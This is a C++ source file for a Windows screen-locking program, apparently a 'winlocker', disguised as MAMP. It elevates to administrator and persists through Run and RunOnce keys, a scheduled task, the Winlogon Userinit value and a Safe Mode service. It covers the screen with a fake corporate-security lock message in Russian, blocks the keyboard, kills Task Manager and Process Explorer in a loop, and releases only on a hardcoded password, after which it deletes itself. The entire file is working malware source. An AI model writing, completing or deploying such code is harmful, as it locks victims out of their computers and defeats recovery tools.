#include <shlobj.h>
#include <tlhelp32.h>
#include <windows.h>
#include <winreg.h>

#include <iostream>
#include <string>

#define PASSWORD "314159265"
// #define DEBUG_MODE  // for testing

SERVICE_STATUS g_Status = {};
SERVICE_STATUS_HANDLE g_hStatus = NULL;

// ============================================================
// Forward declarations
// ============================================================
void CheckPassword(HWND hwnd);
void AddNumber(HWND hEdit, const char* number);
std::string GetInstallPath();
void SaveInstallPath();
DWORD FindProcessID(const char* processName);
void RunAsAdmin();
bool IsRunAsAdmin();
void AddToStartup();
BOOL AddToSafeBoot();
void CleanupAndExit(HWND hwnd);
void BlockKeyboard();
void WatchTaskManager();
void AddToWinlogon();
void AddToRunOnce();

// ============================================================
// Globals
// ============================================================
std::string enteredPassword = "";
HWND g_hwnd = NULL;
HHOOK g_hKeyboardHook = NULL;

// ============================================================
// Utilities
// ============================================================
DWORD FindProcessID(const char* processName) {
  PROCESSENTRY32 processInfo;
  processInfo.dwSize = sizeof(PROCESSENTRY32);
  HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (snap == INVALID_HANDLE_VALUE) return 0;
  if (Process32First(snap, &processInfo)) {
    do {
      if (!_stricmp(processInfo.szExeFile, processName)) {
        CloseHandle(snap);
        return processInfo.th32ProcessID;
      }
    } while (Process32Next(snap, &processInfo));
  }
  CloseHandle(snap);
  return 0;
}

void SaveInstallPath() {
  char path[MAX_PATH];
  GetModuleFileNameA(NULL, path, MAX_PATH);
  HKEY hKey;
  LONG res = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "Software\\MAMP", 0, NULL,
                             REG_OPTION_NON_VOLATILE,
                             KEY_WRITE | KEY_WOW64_64KEY, NULL, &hKey, NULL);
  if (res != ERROR_SUCCESS) return;
  RegSetValueExA(hKey, "InstallPath", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
  RegCloseKey(hKey);
}

std::string GetInstallPath() {
  char path[MAX_PATH] = {};
  DWORD size = MAX_PATH;
  HKEY hKey;
  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\MAMP", 0,
                    KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
    RegQueryValueExA(hKey, "InstallPath", NULL, NULL, (BYTE*)path, &size);
    RegCloseKey(hKey);
  }
  if (strlen(path) == 0) GetModuleFileNameA(NULL, path, MAX_PATH);
  return std::string(path);
}

bool IsRunAsAdmin() {
  BOOL fIsRunAsAdmin = FALSE;
  PSID pAdminGroup;
  SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
  if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                               DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0,
                               &pAdminGroup)) {
    CheckTokenMembership(NULL, pAdminGroup, &fIsRunAsAdmin);
    FreeSid(pAdminGroup);
  }
  return fIsRunAsAdmin;
}

void RunAsAdmin() {
  if (!IsRunAsAdmin()) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    SHELLEXECUTEINFO sei = {sizeof(sei)};
    sei.lpVerb = "runas";
    sei.lpFile = path;
    sei.nShow = SW_SHOWNORMAL;
    if (!ShellExecuteEx(&sei)) {
      MessageBoxA(NULL, "Run as Administrator manually.", "Error",
                  MB_ICONERROR);
      exit(1);
    }
    exit(0);
  }
}

void AddToStartup() {
  std::string path = GetInstallPath();
  std::string quotedPath = "\"" + path + "\"";

  HKEY hKey;
  if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                      NULL, REG_OPTION_NON_VOLATILE,
                      KEY_WRITE | KEY_WOW64_64KEY, NULL, &hKey,
                      NULL) == ERROR_SUCCESS) {
    RegSetValueExA(hKey, "MAMP", 0, REG_SZ, (BYTE*)quotedPath.c_str(),
                   quotedPath.size() + 1);
    RegCloseKey(hKey);
  }
  if (RegCreateKeyExA(HKEY_CURRENT_USER,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                      NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey,
                      NULL) == ERROR_SUCCESS) {
    RegSetValueExA(hKey, "MAMP", 0, REG_SZ, (BYTE*)quotedPath.c_str(),
                   quotedPath.size() + 1);
    RegCloseKey(hKey);
  }
  std::string taskCmd =
      "schtasks /Create /SC ONLOGON /TN \"MAMP AutoStart\" /TR " + quotedPath +
      " /RL HIGHEST /F > nul 2>&1";
  system(taskCmd.c_str());
}

BOOL AddToSafeBoot() {
  std::string installPath = GetInstallPath();
  char path[MAX_PATH] = {};
  strncpy(path, installPath.c_str(), MAX_PATH - 1);

  SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
  if (!hSCM) return FALSE;

  SC_HANDLE hService =
      CreateServiceA(hSCM, "MAMPService", "MAMP Service", SERVICE_ALL_ACCESS,
                     SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
                     SERVICE_ERROR_IGNORE, path, NULL, NULL, NULL, NULL, NULL);

  if (!hService) {
    if (GetLastError() == ERROR_SERVICE_EXISTS)
      hService = OpenServiceA(hSCM, "MAMPService", SERVICE_ALL_ACCESS);
    if (!hService) {
      CloseServiceHandle(hSCM);
      return FALSE;
    }
  }
  CloseServiceHandle(hService);
  CloseServiceHandle(hSCM);

  HKEY hKey;
  const char* safebootPaths[] = {
      "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\MAMPService",
      "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\MAMPService"};
  for (int i = 0; i < 2; i++) {
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, safebootPaths[i], 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey,
                        NULL) == ERROR_SUCCESS) {
      const char* val = "Service";
      RegSetValueExA(hKey, "", 0, REG_SZ, (const BYTE*)val, strlen(val) + 1);
      RegCloseKey(hKey);
    }
  }
  return TRUE;
}

void AddToWinlogon() {
  HKEY hKey;
  std::string installPath = GetInstallPath();

  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                    0, KEY_READ | KEY_WRITE | KEY_WOW64_64KEY,
                    &hKey) == ERROR_SUCCESS) {
    char current[512] = {};
    DWORD size = sizeof(current);
    RegQueryValueExA(hKey, "Userinit", NULL, NULL, (BYTE*)current, &size);
    std::string newVal = std::string(current);
    if (newVal.find(installPath) == std::string::npos) {
      if (!newVal.empty() && newVal.back() != ',') newVal += ",";
      newVal += installPath + ",";
      RegSetValueExA(hKey, "Userinit", 0, REG_SZ, (BYTE*)newVal.c_str(),
                     newVal.size() + 1);
    }
    RegCloseKey(hKey);
  }
}

void AddToRunOnce() {
  std::string installPath = GetInstallPath();
  std::string quotedPath = "\"" + installPath + "\"";
  HKEY hKey;
  if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
                      "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                      0, NULL, REG_OPTION_NON_VOLATILE,
                      KEY_WRITE | KEY_WOW64_64KEY, NULL, &hKey,
                      NULL) == ERROR_SUCCESS) {
    RegSetValueExA(hKey, "MAMP", 0, REG_SZ, (BYTE*)quotedPath.c_str(),
                   quotedPath.size() + 1);
    RegCloseKey(hKey);
  }
}

void CleanupAndExit(HWND hwnd) {
  char path[MAX_PATH];
  GetModuleFileNameA(NULL, path, MAX_PATH);

  if (g_hKeyboardHook) {
    UnhookWindowsHookEx(g_hKeyboardHook);
    g_hKeyboardHook = NULL;
  }

  ShowWindow(hwnd, SW_HIDE);
  SetWindowPos(hwnd, HWND_NOTOPMOST, 0, 0, 0, 0,
               SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);

  HKEY hKey;
  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                    0, KEY_READ | KEY_WRITE | KEY_WOW64_64KEY,
                    &hKey) == ERROR_SUCCESS) {
    const char* defaultShell = "explorer.exe";
    const char* defaultUserinit = "C:\\Windows\\system32\\userinit.exe,";
    RegSetValueExA(hKey, "Shell", 0, REG_SZ, (const BYTE*)defaultShell,
                   strlen(defaultShell) + 1);
    RegSetValueExA(hKey, "Userinit", 0, REG_SZ, (const BYTE*)defaultUserinit,
                   strlen(defaultUserinit) + 1);
    RegCloseKey(hKey);
  }
  // Убрать HKCU override
  if (RegOpenKeyExA(HKEY_CURRENT_USER,
                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                    0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
    RegDeleteValueA(hKey, "Shell");
    RegDeleteValueA(hKey, "Userinit");
    RegCloseKey(hKey);
  }

  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                    KEY_WRITE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
    RegDeleteValueA(hKey, "MAMP");
    RegCloseKey(hKey);
  }
  if (RegOpenKeyExA(HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                    KEY_WRITE, &hKey) == ERROR_SUCCESS) {
    RegDeleteValueA(hKey, "MAMP");
    RegCloseKey(hKey);
  }

  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0,
                    KEY_WRITE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
    RegDeleteValueA(hKey, "MAMP");
    RegCloseKey(hKey);
  }
  if (RegOpenKeyExA(HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0,
                    KEY_WRITE, &hKey) == ERROR_SUCCESS) {
    RegDeleteValueA(hKey, "MAMP");
    RegCloseKey(hKey);
  }

  system("schtasks /Delete /TN \"MAMP AutoStart\" /F > nul 2>&1");

  RegDeleteKeyA(
      HKEY_LOCAL_MACHINE,
      "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\MAMPService");
  RegDeleteKeyA(
      HKEY_LOCAL_MACHINE,
      "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\MAMPService");

  SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
  if (hSCM) {
    SC_HANDLE hSvc = OpenServiceA(hSCM, "MAMPService", SERVICE_STOP | DELETE);
    if (hSvc) {
      SERVICE_STATUS ss = {};
      ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
      for (int i = 0; i < 6; i++) {
        QueryServiceStatus(hSvc, &ss);
        if (ss.dwCurrentState == SERVICE_STOPPED) break;
        Sleep(500);
      }
      DeleteService(hSvc);
      CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hSCM);
  }

  RegDeleteKeyA(HKEY_LOCAL_MACHINE, "Software\\MAMP");

  if (FindProcessID("explorer.exe") == 0) {
    STARTUPINFOA siEx = {sizeof(siEx)};
    PROCESS_INFORMATION piEx = {};
    char explorerPath[] = "explorer.exe";
    CreateProcessA(NULL, explorerPath, NULL, NULL, FALSE, 0, NULL, NULL, &siEx,
                   &piEx);
    CloseHandle(piEx.hProcess);
    CloseHandle(piEx.hThread);
    Sleep(2000);
  }

  HWND hTray = FindWindowA("Shell_TrayWnd", NULL);
  if (hTray) {
    SetWindowPos(hTray, HWND_TOP, 0, 0, 0, 0,
                 SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
    ShowWindow(hTray, SW_SHOW);
  }

  RedrawWindow(NULL, NULL, NULL,
               RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN | RDW_ERASENOW |
                   RDW_UPDATENOW);

#ifndef DEBUG_MODE
  std::string delCmd = "cmd /c ping 127.0.0.1 -n 4 > nul & del /F /Q \"" +
                       std::string(path) + "\"";
  STARTUPINFOA si = {sizeof(si)};
  si.dwFlags = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  PROCESS_INFORMATION pi = {};
  CreateProcessA(NULL, (LPSTR)delCmd.c_str(), NULL, NULL, FALSE,
                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);
#endif

  DestroyWindow(hwnd);
}

void CheckPassword(HWND hwnd) {
  if (enteredPassword == PASSWORD) {
    CleanupAndExit(hwnd);
  } else {
    enteredPassword = "";
    SetWindowTextA(GetDlgItem(hwnd, 1), "");
    MessageBoxA(hwnd, "Wrong password!", "Error", MB_OK);
  }
}

void AddNumber(HWND hEdit, const char* number) {
  enteredPassword += number;
  SetWindowTextA(hEdit, enteredPassword.c_str());
}

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
  if (nCode >= 0) return 1;
  return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

void BlockKeyboard() {
  g_hKeyboardHook =
      SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, GetModuleHandleA(NULL), 0);
}

void WatchTaskManager() {
  const char* targets[] = {"Taskmgr.exe", "ProcessHacker.exe", "procexp64.exe",
                           "procexp.exe"};
  while (true) {
    Sleep(1000);
    for (const char* proc : targets) {
      DWORD pid = FindProcessID(proc);
      if (pid) {
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProcess) {
          TerminateProcess(hProcess, 1);
          CloseHandle(hProcess);
        }
      }
    }
  }
}

// ============================================================
// Window
// ============================================================
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam,
                            LPARAM lParam) {
  static HWND hEdit, hButton, hBackspace, hTitle, hWarning;
  static HWND numButtons[10];

  switch (uMsg) {
    case WM_CREATE: {
      int width = GetSystemMetrics(SM_CXSCREEN);
      int height = GetSystemMetrics(SM_CYSCREEN);

      SetClassLongPtr(hwnd, GCLP_HBRBACKGROUND,
                      (LONG_PTR)CreateSolidBrush(RGB(0, 0, 0)));
      InvalidateRect(hwnd, NULL, TRUE);

      hTitle = CreateWindowA("STATIC", "Введите пароль для разблокировки",
                             WS_CHILD | WS_VISIBLE | SS_CENTER, width / 2 - 300,
                             height / 4 - 50, 600, 50, hwnd, NULL, NULL, NULL);

      hWarning = CreateWindowA(
          "STATIC",
          "Доступ заблокирован корпоративной системой безопасности.\n"
          "Для разблокировки обратитесь к системному администратору.",
          WS_CHILD | WS_VISIBLE | SS_CENTER, width / 2 - 300, height / 4, 600,
          80, hwnd, NULL, NULL, NULL);

      hEdit = CreateWindowA(
          "EDIT", "", WS_CHILD | WS_VISIBLE | ES_PASSWORD | ES_AUTOHSCROLL,
          width / 2 - 120, height / 2, 200, 30, hwnd, (HMENU)1, NULL, NULL);

      hButton = CreateWindowA("BUTTON", "Подтвердить", WS_CHILD | WS_VISIBLE,
                              width / 2 - 75, height / 2 + 50, 150, 40, hwnd,
                              (HMENU)2, NULL, NULL);

      hBackspace =
          CreateWindowA("BUTTON", "<", WS_CHILD | WS_VISIBLE, width / 2 + 90,
                        height / 2, 30, 30, hwnd, (HMENU)3, NULL, NULL);

      for (int i = 0; i < 10; i++) {
        std::string text = std::to_string(i);
        numButtons[i] =
            CreateWindowA("BUTTON", text.c_str(), WS_CHILD | WS_VISIBLE,
                          width / 2 - 190 + (i * 40), height / 2 + 100, 35, 35,
                          hwnd, (HMENU)(ULONG_PTR)(4 + i), NULL, NULL);
      }
      break;
    }

    case WM_COMMAND:
      if (LOWORD(wParam) == 2) {
        CheckPassword(hwnd);
      } else if (LOWORD(wParam) == 3) {
        if (!enteredPassword.empty()) {
          enteredPassword.pop_back();
          SetWindowTextA(hEdit, enteredPassword.c_str());
        }
      } else if (LOWORD(wParam) >= 4 && LOWORD(wParam) <= 13) {
        std::string num = std::to_string(LOWORD(wParam) - 4);
        AddNumber(hEdit, num.c_str());
      }
      break;

    case WM_CLOSE:
      return 0;

    case WM_DESTROY:
      PostQuitMessage(0);
      return 0;

    default:
      return DefWindowProc(hwnd, uMsg, wParam, lParam);
  }
  return 0;
}

// ============================================================
// DoWork
// ============================================================
void DoWork() {
  AddToStartup();
  AddToWinlogon();  // только Userinit теперь, Shell не трогает
  AddToRunOnce();

  HINSTANCE hInst = GetModuleHandleA(NULL);

  WNDCLASSA wc = {};
  wc.lpfnWndProc = WindowProc;
  wc.hInstance = hInst;
  wc.lpszClassName = "MAMPClass";
  wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
  RegisterClassA(&wc);

  g_hwnd =
      CreateWindowExA(WS_EX_TOPMOST, "MAMPClass", "MAMP", WS_POPUP | WS_VISIBLE,
                      0, 0, GetSystemMetrics(SM_CXSCREEN),
                      GetSystemMetrics(SM_CYSCREEN), NULL, NULL, hInst, NULL);

  SetWindowPos(g_hwnd, HWND_TOPMOST, 0, 0, GetSystemMetrics(SM_CXSCREEN),
               GetSystemMetrics(SM_CYSCREEN), SWP_SHOWWINDOW);

  BlockKeyboard();

  CreateThread(
      NULL, 0,
      [](LPVOID) -> DWORD {
        WatchTaskManager();
        return 0;
      },
      NULL, 0, NULL);

  MSG msg;
  while (GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }
}

// ============================================================
// Service
// ============================================================
VOID WINAPI ServiceCtrlHandler(DWORD ctrl) {
  if (ctrl == SERVICE_CONTROL_STOP || ctrl == SERVICE_CONTROL_SHUTDOWN) {
    g_Status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_hStatus, &g_Status);
  }
}

VOID WINAPI ServiceMain(DWORD argc, LPSTR* argv) {
  g_hStatus = RegisterServiceCtrlHandlerA("MAMPService", ServiceCtrlHandler);
  if (!g_hStatus) return;

  g_Status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
  g_Status.dwCurrentState = SERVICE_RUNNING;
  g_Status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
  SetServiceStatus(g_hStatus, &g_Status);

  std::string installPath = GetInstallPath();
  std::string quotedPath = "\"" + installPath + "\"";
  std::string cmd = "schtasks /Run /TN \"MAMP AutoStart\" > nul 2>&1";
  system(cmd.c_str());

  while (g_Status.dwCurrentState == SERVICE_RUNNING) {
    Sleep(3000);
    if (FindProcessID("MAMP.exe") == 0) {
      system(cmd.c_str());
    }
  }

  g_Status.dwCurrentState = SERVICE_STOPPED;
  SetServiceStatus(g_hStatus, &g_Status);
}

// ============================================================
// Entry point
// ============================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
  // Лог в файл — видим что происходит при автозапуске
  FILE* f = fopen("C:\\Windows\\Temp\\mamp_log.txt", "a");
  if (f) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    fprintf(f, "[%02d:%02d:%02d] WinMain started, cmdline='%s'\n", st.wHour,
            st.wMinute, st.wSecond, lpCmdLine ? lpCmdLine : "null");
    fclose(f);
  }

  SERVICE_TABLE_ENTRYA table[] = {{(LPSTR) "MAMPService", ServiceMain},
                                  {NULL, NULL}};
  BOOL asSvc = StartServiceCtrlDispatcherA(table);

  if (!asSvc) {
    DWORD err = GetLastError();

    if (f = fopen("C:\\Windows\\Temp\\mamp_log.txt", "a")) {
      fprintf(f, "[asSvc=FALSE] err=%lu, IsAdmin=%d\n", err, IsRunAsAdmin());
      fclose(f);
    }

    if (err == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
      if (!IsRunAsAdmin()) {
        RunAsAdmin();
        return 0;
      }

      HKEY hKey;
      bool hasRunKey = false;
      if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
                        KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
        char val[MAX_PATH] = {};
        DWORD s = MAX_PATH;
        LONG r = RegQueryValueExA(hKey, "MAMP", NULL, NULL, (BYTE*)val, &s);
        RegCloseKey(hKey);
        hasRunKey = (r == ERROR_SUCCESS);
      }

      if (f = fopen("C:\\Windows\\Temp\\mamp_log.txt", "a")) {
        fprintf(f, "hasRunKey=%d, calling DoWork...\n", hasRunKey);
        fclose(f);
      }

      if (!hasRunKey) {
        SaveInstallPath();
        AddToSafeBoot();
        AddToStartup();
        AddToWinlogon();
      }

      DoWork();
    }
  }

  return 0;
}